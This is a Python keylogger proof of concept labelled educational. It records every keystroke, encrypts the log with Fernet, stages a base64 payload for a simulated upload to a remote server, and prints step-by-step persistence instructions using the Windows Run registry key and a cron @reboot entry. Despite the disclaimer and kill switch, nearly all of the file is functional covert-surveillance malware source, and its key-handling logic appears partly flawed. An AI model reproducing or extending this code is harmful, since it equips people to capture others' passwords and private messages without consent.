# ==============================================================================
# ENCRYPTED KEYLOGGER PROOF-OF-CONCEPT (PoC) - EDUCATIONAL USE ONLY
# ==============================================================================
# This script is strictly for educational purposes to demonstrate:
# 1. Keystroke capturing (pynput)
# 2. Data encryption (cryptography.fernet)
# 3. Simulated data exfiltration (network simulation)
# 4. Persistence and Kill Switch mechanisms
#
# DO NOT deploy or use this code on any system without explicit, informed
# consent from the owner. Keylogging without permission is illegal and unethical.
# ==============================================================================

import os
import time
import base64
from datetime import datetime
from pynput import keyboard
from cryptography.fernet import Fernet

# --- CONFIGURATION ---
LOG_FILE = "encrypted_keys.log"
KEY_FILE = "secret.key"
KILL_SWITCH_FILE = "KILL_SWITCH.txt"
EXFILTRATION_INTERVAL_SECONDS = 30 # How often to simulate sending data

# --- GLOBAL STATE ---
current_keys = []
timer_start = time.time()
fernet_cipher = None
LOG_ENTRY_SEPARATOR = "|||" # Separator to distinguish different encrypted log entries

# ==============================================================================
# 1. ENCRYPTION KEY MANAGEMENT
# ==============================================================================

def load_or_generate_key():
    """
    Loads the encryption key from a file or generates a new one.
    The Fernet key must be kept secret and securely stored in a real-world scenario.
    """
    try:
        if os.path.exists(KEY_FILE):
            with open(KEY_FILE, 'rb') as f:
                key = f.read()
            print(f"[*] Loaded existing encryption key from {KEY_FILE}")
        else:
            key = Fernet.generate_key()
            with open(KEY_FILE, 'wb') as f:
                f.write(key)
            print(f"[+] Generated new encryption key and saved to {KEY_FILE}")
        
        global fernet_cipher
        fernet_cipher = Fernet(key)
        return True
    except Exception as e:
        print(f"[!] Error managing encryption key: {e}")
        return False

# ==============================================================================
# 2. LOGGING AND ENCRYPTION
# ==============================================================================

def encrypt_and_write(log_content):
    """
    Encrypts the collected log content and appends it to the log file.
    """
    if not fernet_cipher:
        print("[!] Encryption cipher not initialized. Skipping log save.")
        return

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    # Format the log entry: [TIMESTAMP] content
    raw_entry = f"[{timestamp}] {log_content}\n"
    
    try:
        # Encode the raw entry to bytes before encryption
        encrypted_data = fernet_cipher.encrypt(raw_entry.encode())
        
        # Write the base64-encoded encrypted data followed by a separator
        with open(LOG_FILE, 'ab') as f:
            f.write(encrypted_data + LOG_ENTRY_SEPARATOR.encode() + b'\n')
        
    except Exception as e:
        print(f"[!] Error encrypting or writing data: {e}")

# ==============================================================================
# 3. KEYBOARD LISTENERS
# ==============================================================================

def on_press(key):
    """Handles key press events."""
    global current_keys
    try:
        # Check for kill switch sequence (e.g., F12 key)
        if key == keyboard.Key.f12:
            print("\n[!] F12 detected. Stopping listener...")
            return False # Returning False stops the listener

        # Log special keys (like space, enter, shift)
        if key == keyboard.Key.space:
            current_keys.append(' ')
        elif key == keyboard.Key.enter:
            # When Enter is pressed, flush the buffer and encrypt/write the log entry
            log_content = "".join(current_keys)
            if log_content.strip():
                encrypt_and_write(f"KEY_INPUT: {log_content}")
            current_keys = []
            current_keys.append('\n[ENTER]\n') # Add a marker for the new line
        elif key is not None and key not in [keyboard.Key.shift, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
            # Log all other special keys explicitly
            current_keys.append(f'[{str(key).split(".")[-1].upper()}]')

    except AttributeError:
        # Log alphanumeric keys
        current_keys.append(key.char)
    except Exception as e:
        print(f"[!] Error in on_press: {e}")

def on_release(key):
    """Handles key release events (optional but required by listener structure)."""
    # Exfiltration simulation check is done here periodically
    global timer_start, current_keys
    
    if time.time() - timer_start > EXFILTRATION_INTERVAL_SECONDS:
        # Flush any remaining keys before exfiltration
        log_content = "".join(current_keys)
        if log_content.strip():
            encrypt_and_write(f"BUFFER_FLUSH: {log_content}")
        current_keys = []
        
        simulate_exfiltration()
        timer_start = time.time()

    # Kill switch file check
    if os.path.exists(KILL_SWITCH_FILE):
        print(f"\n[!!!] Detected KILL_SWITCH_FILE ({KILL_SWITCH_FILE}). Shutting down.")
        return False

# ==============================================================================
# 4. DATA EXFILTRATION SIMULATION (AND DECRYPTION FOR PoC)
# ==============================================================================

def simulate_exfiltration():
    """
    Reads the encrypted log file and simulates sending its content to a remote server.
    The log file is then wiped (or truncated) upon successful 'upload'.
    """
    print(f"\n--- Starting simulated data exfiltration at {datetime.now().time().strftime('%H:%M:%S')} ---")
    
    if not os.path.exists(LOG_FILE):
        print("[*] Log file is empty or does not exist. Nothing to exfiltrate.")
        return

    try:
        with open(LOG_FILE, 'rb') as f:
            full_encrypted_data = f.read()

        # Split the log content by the separator
        encrypted_entries = full_encrypted_data.split(LOG_ENTRY_SEPARATOR.encode() + b'\n')
        
        # Filter out empty entries resulting from the split
        encrypted_entries = [e for e in encrypted_entries if e.strip()]

        if not encrypted_entries:
            print("[*] Log file found, but no new complete encrypted entries detected.")
            return
            
        print(f"[*] Total {len(encrypted_entries)} encrypted entries found for exfiltration.")
        
        # --- SIMULATION: Sending Encrypted Data ---
        print("\n--- BEGIN ENCRYPTED PAYLOAD (SIMULATED HTTP POST BODY) ---")
        # In a real scenario, this payload would be sent over HTTP/S or a custom socket.
        payload = {
            "user_id": base64.b64encode(os.urandom(10)).decode(), # Mock User ID
            "encrypted_data": base64.b64encode(full_encrypted_data).decode()
        }
        
        # We print the first 100 bytes of the encrypted data to show what's being sent
        print(f"Payload Size: {len(payload['encrypted_data'])} bytes")
        print(f"Example Data Start: {payload['encrypted_data'][:100]}...")
        print("--- END ENCRYPTED PAYLOAD ---")

        # Simulate successful server response
        print(f"[+] SUCCESS: Data simulated sent to remote server (localhost:5000/upload).")
        
        # Wipe the local log file after 'successful' exfiltration
        open(LOG_FILE, 'w').close()
        print(f"[*] Local log file '{LOG_FILE}' wiped after exfiltration.")

        # --- PoC: Decryption Demonstration (for verification only) ---
        print("\n--- PoC VERIFICATION: DECRYPTED CONTENT ---")
        for entry in encrypted_entries:
            if entry:
                try:
                    decrypted_entry = fernet_cipher.decrypt(entry).decode()
                    print(f"| DECRYPTED | {decrypted_entry.strip()}")
                except Exception as e:
                    print(f"[!] FAILED DECRYPTION (Key mismatch/tampered data): {entry[:50]}...")
        print("---------------------------------------------")

    except Exception as e:
        print(f"[!] Error during exfiltration simulation: {e}")

# ==============================================================================
# 5. PERSISTENCE GUIDE (ETHICAL CONSTRAINT: DO NOT AUTO-INSTALL)
# ==============================================================================

def persistence_guide():
    """
    Provides a guide on how to set up persistence for educational purposes.
    The script DOES NOT automatically execute these commands.
    """
    print("\n" + "="*80)
    print("PERSISTENCE SETUP GUIDE (MANUAL - FOR EDUCATIONAL UNDERSTANDING ONLY)")
    print("="*80)
    print("The goal of persistence is to ensure the script runs after system reboot.")
    print(f"The executable path would be: {os.path.abspath(__file__)}\n")
    
    print("1. Windows (Registry or Task Scheduler):")
    print("   Registry: Add a key to 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'")
    print("   Value: pythonw.exe C:\\Path\\To\\keylogger_poc.py")
    
    print("\n2. Linux (Cron or Systemd):")
    print("   Cron Job: Use 'crontab -e' and add line:")
    print("   @reboot /usr/bin/python3 /path/to/keylogger_poc.py &")
    
    print("\n3. Kill Switch:")
    print(f"   To stop this PoC, simply create an empty file named '{KILL_SWITCH_FILE}' in the current directory.")
    print("="*80 + "\n")

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================

if __name__ == "__main__":
    
    # 1. Setup the key and cipher
    if not load_or_generate_key():
        print("[FATAL] Could not initialize encryption key. Exiting.")
        exit(1)
        
    # 2. Provide persistence guide
    persistence_guide()
    
    # 3. Initial check for kill switch before starting
    if os.path.exists(KILL_SWITCH_FILE):
        print(f"[INFO] {KILL_SWITCH_FILE} found. Please delete it to run the script.")
        exit(0)
    
    print("[RUNNING] Listening for keystrokes. Press F12 or create KILL_SWITCH.txt to stop.")
    print(f"[LOG PATH] Encrypted logs are stored in: {LOG_FILE}")
    print(f"[EXFILTRATION] Simulation runs every {EXFILTRATION_INTERVAL_SECONDS} seconds.")
    
    try:
        # Start the key listener
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
            
    except KeyboardInterrupt:
        print("\n[STOPPED] Exiting via Keyboard Interrupt (Ctrl+C).")
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred: {e}")

    # One final exfiltration before quitting (if the listener stopped cleanly)
    simulate_exfiltration()
    print("[EXIT] Keylogger PoC terminated.")